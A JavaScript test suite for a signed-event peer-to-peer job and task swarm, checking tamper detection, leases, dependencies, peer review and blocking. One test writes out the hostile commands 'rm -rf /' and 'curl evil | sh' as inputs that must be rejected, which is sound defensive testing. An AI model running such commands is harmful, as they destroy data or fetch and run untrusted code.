import test from 'node:test'
import assert from 'node:assert/strict'
import DHT from 'hyperdht'
import { createSeed, identityFromSeed } from '../src/core/identity.js'
import { createEvent, checkEvent, canonical, MAX_LAMPORT } from '../src/core/events.js'
import { createSwarmKey, topicFromKey, encodeLink, parseLink, lobbyKey } from '../src/core/link.js'
import { reduce } from '../src/core/state.js'

const swarm = 'ab'.repeat(32)
const alice = identityFromSeed(createSeed())
const bob = identityFromSeed(createSeed())
const mallory = identityFromSeed(createSeed())
const carol = identityFromSeed(createSeed())

let clock = 0
const ev = (who, type, body, extra = {}) => createEvent(who, { swarm, lamport: ++clock, type, body, ts: 1_000_000 + clock * 1000, ...extra })

test('signing key and transport key are the same identity', () => {
  const seed = createSeed()
  assert.deepEqual(identityFromSeed(seed).publicKey, Buffer.from(DHT.keyPair(seed).publicKey))
})

test('canonical encoding ignores key order', () => {
  assert.equal(canonical({ b: 1, a: [2, { d: 1, c: 2 }] }), canonical({ a: [2, { c: 2, d: 1 }], b: 1 }))
})

test('a well-formed event verifies', () => {
  assert.equal(checkEvent(ev(alice, 'msg', { text: 'hello' }), { swarm, now: 2_000_000 }), null)
})

test('tampering with any part of an event is detected', () => {
  const e = ev(alice, 'msg', { text: 'pay bob' })
  assert.match(checkEvent({ ...e, body: { text: 'pay mallory' } }, { now: 2e6 }), /id does not match/)
  assert.match(checkEvent({ ...e, author: mallory.id }, { now: 2e6 }), /id does not match/)
  const forged = ev(mallory, 'msg', { text: 'pay mallory' })
  assert.match(checkEvent({ ...forged, author: alice.id }, { now: 2e6 }), /id does not match|bad signature/)
  assert.match(checkEvent({ ...e, sig: forged.sig }, { now: 2e6 }), /bad signature/)
})

test('events for another swarm, from the future, or with absurd clocks are rejected', () => {
  const e = ev(alice, 'msg', { text: 'x' })
  assert.match(checkEvent(e, { swarm: 'cd'.repeat(32), now: 2e6 }), /wrong swarm/)
  assert.match(checkEvent(e, { swarm, now: 0 }), /future/)
  assert.throws(() => checkEventOrThrow(createEvent(alice, { swarm, lamport: MAX_LAMPORT + 1, type: 'msg', body: { text: 'x' }, ts: 1 })), /bad lamport/)
})

function checkEventOrThrow (e) {
  const problem = checkEvent(e, { now: 2e6 })
  if (problem) throw new Error(problem)
}

test('unknown event types and unknown fields cannot be created or accepted', () => {
  assert.throws(() => ev(alice, 'shell.exec', { cmd: 'rm -rf /' }), /unknown event type/)
  assert.throws(() => ev(alice, 'msg', { text: 'hi', run: 'curl evil | sh' }), /invalid body/)
  assert.throws(() => ev(alice, 'task.submit', { task: 'nope', summary: 's', content: 'x' }), /invalid body/)
  const e = ev(alice, 'msg', { text: 'hi' })
  assert.match(checkEvent({ ...e, extra: 1 }, { now: 2e6 }), /unexpected fields/)
})

test('oversized content is refused', () => {
  assert.throws(() => ev(alice, 'task.submit', { task: `${'a'.repeat(64)}:0`, summary: 's', content: 'x'.repeat(200001) }), /invalid body/)
})

test('links round-trip and hide the key from the topic', () => {
  const key = createSwarmKey()
  const parsed = parseLink(encodeLink(key, 'docs sprint & more'))
  assert.deepEqual(parsed.key, key)
  assert.equal(parsed.name, 'docs sprint & more')
  assert.notDeepEqual(topicFromKey(key), key)
  assert.deepEqual(parseLink('lobby').key, lobbyKey())
  assert.throws(() => parseLink('swarm://nothex'), /invalid swarm link/)
  assert.throws(() => parseLink('https://example.com'), /invalid swarm link/)
})

test('a submitted result completes its task with no approval step', () => {
  const job = ev(alice, 'job.post', { title: 'Translate', description: 'd', tasks: [{ title: 'fr' }, { title: 'de' }] })
  const t0 = `${job.id}:0`
  const final = `${job.id}:final`
  const claim = ev(bob, 'task.claim', { task: t0, leaseMs: 60000 })
  let v = reduce([job, claim], { now: claim.ts + 1 })
  assert.equal(v.tasks.get(t0).status, 'claimed')
  assert.equal(v.tasks.get(t0).holder.peer, bob.id)
  assert.equal(v.tasks.get(final).status, 'blocked')

  const sub = ev(bob, 'task.submit', { task: t0, summary: 'done', content: 'bonjour' })
  v = reduce([sub, claim, job], { now: sub.ts }) // arrival order must not matter
  assert.equal(v.tasks.get(t0).status, 'done')
  assert.equal(v.tasks.get(t0).accepted, sub.id)
  assert.equal(v.tasks.get(t0).holder, null)
  assert.equal(v.jobs.get(job.id).done, 1)
  assert.equal(v.jobs.get(job.id).total, 3)
  assert.equal(v.jobs.get(job.id).status, 'active')
})

test('the final task unlocks when everything else is done, and its result is the job result', () => {
  const job = ev(alice, 'job.post', { title: 'j', description: '', tasks: [{ title: 'a' }, { title: 'b' }] })
  const final = `${job.id}:final`
  const early = ev(mallory, 'task.submit', { task: final, summary: 'skip the queue', content: 'x' })
  const earlyClaim = ev(mallory, 'task.claim', { task: final, leaseMs: 60000 })
  const a = ev(bob, 'task.submit', { task: `${job.id}:0`, summary: 'a', content: 'A' })
  let v = reduce([job, early, earlyClaim, a], { now: a.ts })
  assert.equal(v.tasks.get(final).status, 'blocked')
  assert.deepEqual(v.tasks.get(final).blockedBy, [`${job.id}:1`])
  assert.equal(v.tasks.get(final).submissions.length, 0)

  const b = ev(carol, 'task.submit', { task: `${job.id}:1`, summary: 'b', content: 'B' })
  v = reduce([job, early, earlyClaim, a, b], { now: b.ts })
  assert.equal(v.tasks.get(final).status, 'open')
  assert.equal(v.jobs.get(job.id).status, 'active')

  const done = ev(bob, 'task.submit', { task: final, summary: 'all of it', content: 'A+B' })
  v = reduce([job, early, earlyClaim, a, b, done], { now: done.ts })
  assert.equal(v.jobs.get(job.id).status, 'complete')
  assert.equal(v.jobs.get(job.id).result.content, 'A+B')
  assert.equal(v.jobs.get(job.id).done, 3)
})

test('a job can be just a goal: it starts as a single open final task', () => {
  const job = ev(alice, 'job.post', { title: 'Write a README', description: 'for vibeworld', tasks: [] })
  const v = reduce([job], { now: job.ts })
  assert.equal(v.jobs.get(job.id).total, 1)
  assert.equal(v.tasks.get(`${job.id}:final`).status, 'open')
  assert.equal(v.tasks.get(`${job.id}:final`).final, true)
})

test('anyone can extend the plan, and dependencies hold work back until they are met', () => {
  const job = ev(alice, 'job.post', { title: 'Build it', description: '', tasks: [] })
  const final = `${job.id}:final`
  const design = ev(bob, 'task.add', { job: job.id, title: 'design the API' })
  const impl = ev(carol, 'task.add', { job: job.id, title: 'implement', needs: [design.id] })
  const bogus = ev(mallory, 'task.add', { job: job.id, title: 'depends on nonsense', needs: [final, 'f'.repeat(64)] })
  let v = reduce([job, design, impl, bogus], { now: bogus.ts })
  assert.equal(v.jobs.get(job.id).total, 4)
  assert.equal(v.tasks.get(design.id).status, 'open')
  assert.equal(v.tasks.get(impl.id).status, 'blocked')
  assert.deepEqual(v.tasks.get(bogus.id).needs, []) // unknown and final dependencies are dropped
  assert.equal(v.tasks.get(final).status, 'blocked')

  const tooSoon = ev(carol, 'task.claim', { task: impl.id, leaseMs: 60000 })
  const designed = ev(bob, 'task.submit', { task: design.id, summary: 'api', content: 'GET /x' })
  v = reduce([job, design, impl, bogus, tooSoon, designed], { now: designed.ts })
  assert.equal(v.tasks.get(impl.id).status, 'open') // the early claim never counted
  assert.equal(v.tasks.get(impl.id).holder, null)

  // once the job is delivered the plan is frozen
  const rest = [ev(carol, 'task.submit', { task: impl.id, summary: 'i', content: 'code' }), ev(bob, 'task.submit', { task: bogus.id, summary: 'b', content: 'x' })]
  const deliver = ev(alice, 'task.submit', { task: final, summary: 'f', content: 'done' })
  const late = ev(mallory, 'task.add', { job: job.id, title: 'one more thing' })
  v = reduce([job, design, impl, bogus, tooSoon, designed, ...rest, deliver, late], { now: 9e9 })
  assert.equal(v.jobs.get(job.id).status, 'complete')
  assert.equal(v.jobs.get(job.id).total, 4)
})

test('a second claim loses while the lease is live and wins after it expires', () => {
  const job = ev(alice, 'job.post', { title: 'j', description: '', tasks: [{ title: 't' }] })
  const t0 = `${job.id}:0`
  const first = ev(bob, 'task.claim', { task: t0, leaseMs: 10000 })
  const early = ev(mallory, 'task.claim', { task: t0, leaseMs: 10000 })
  assert.equal(reduce([job, first, early], { now: early.ts }).tasks.get(t0).holder.peer, bob.id)
  const late = ev(mallory, 'task.claim', { task: t0, leaseMs: 10000 }, { ts: first.ts + 10001 })
  assert.equal(reduce([job, first, early, late], { now: late.ts }).tasks.get(t0).holder.peer, mallory.id)
  assert.equal(reduce([job, first], { now: first.ts + 10001 }).tasks.get(t0).status, 'open')
})

test('peer review: a challenge reopens the task, endorsements protect it, the poster has the last word', () => {
  const job = ev(alice, 'job.post', { title: 'j', description: '', tasks: [{ title: 't' }] })
  const t0 = `${job.id}:0`
  const held = ev(bob, 'task.claim', { task: t0, leaseMs: 3600000 })
  const sub = ev(bob, 'task.submit', { task: t0, summary: 'LL', content: 'BB' })
  const self = ev(bob, 'task.review', { task: t0, submission: sub.id, verdict: 'accept' })
  let v = reduce([job, held, sub, self], { now: 9e9 })
  assert.equal(v.tasks.get(t0).status, 'done')
  assert.equal(v.tasks.get(t0).submissions[0].reviews.length, 0) // nobody reviews their own work

  const challenge = ev(carol, 'task.review', { task: t0, submission: sub.id, verdict: 'reject', note: 'two letters is not a README' })
  v = reduce([job, held, sub, self, challenge], { now: challenge.ts })
  assert.equal(v.tasks.get(t0).status, 'open') // reopened, and the old lease is gone
  assert.equal(v.tasks.get(t0).submissions[0].standing, false)
  assert.equal(v.tasks.get(t0).submissions[0].reviews[0].note, 'two letters is not a README')

  const endorse = ev(mallory, 'task.review', { task: t0, submission: sub.id, verdict: 'accept' })
  v = reduce([job, held, sub, self, challenge, endorse], { now: 9e9 })
  assert.equal(v.tasks.get(t0).status, 'done') // 1 for, 1 against: stands

  const changedMind = ev(mallory, 'task.review', { task: t0, submission: sub.id, verdict: 'reject' })
  v = reduce([job, held, sub, self, challenge, endorse, changedMind], { now: 9e9 })
  assert.equal(v.tasks.get(t0).status, 'open') // one vote per peer, latest counts
  assert.equal(v.tasks.get(t0).submissions[0].score, -2)

  const poster = ev(alice, 'task.review', { task: t0, submission: sub.id, verdict: 'accept' })
  v = reduce([job, held, sub, self, challenge, endorse, changedMind, poster], { now: 9e9 })
  assert.equal(v.tasks.get(t0).status, 'done') // the poster overrides the tally

  const better = ev(carol, 'task.submit', { task: t0, summary: 'a real one', content: '# Vibeworld' })
  const posterNo = ev(alice, 'task.review', { task: t0, submission: sub.id, verdict: 'reject' })
  v = reduce([job, held, sub, self, challenge, endorse, changedMind, poster, better, posterNo], { now: 9e9 })
  assert.equal(v.tasks.get(t0).accepted, better.id)
})

test('only the poster can close a job, and a closed job takes no more work', () => {
  const job = ev(alice, 'job.post', { title: 'j', description: '', tasks: [{ title: 't' }] })
  const t0 = `${job.id}:0`
  const sneak = ev(mallory, 'job.close', { job: job.id })
  let v = reduce([job, sneak], { now: 9e9 })
  assert.equal(v.jobs.get(job.id).status, 'active')
  const close = ev(alice, 'job.close', { job: job.id, note: 'changed plans' })
  const after = [ev(bob, 'task.submit', { task: t0, summary: 'late', content: 'x' }), ev(bob, 'task.add', { job: job.id, title: 'late' }), ev(bob, 'task.claim', { task: t0, leaseMs: 60000 })]
  v = reduce([job, sneak, close, ...after], { now: 9e9 })
  assert.equal(v.jobs.get(job.id).status, 'closed')
  assert.equal(v.tasks.get(t0).submissions.length, 0)
  assert.equal(v.jobs.get(job.id).total, 2)
  assert.equal(v.tasks.get(t0).holder, null)
})

test('blocked authors vanish from the view', () => {
  const job = ev(mallory, 'job.post', { title: 'spam', description: '', tasks: [{ title: 't' }] })
  const msg = ev(alice, 'msg', { text: 'hi' })
  const v = reduce([job, msg], { now: 9e9, blocked: new Set([mallory.id]) })
  assert.equal(v.jobs.size, 0)
  assert.equal(v.messages.length, 1)
})
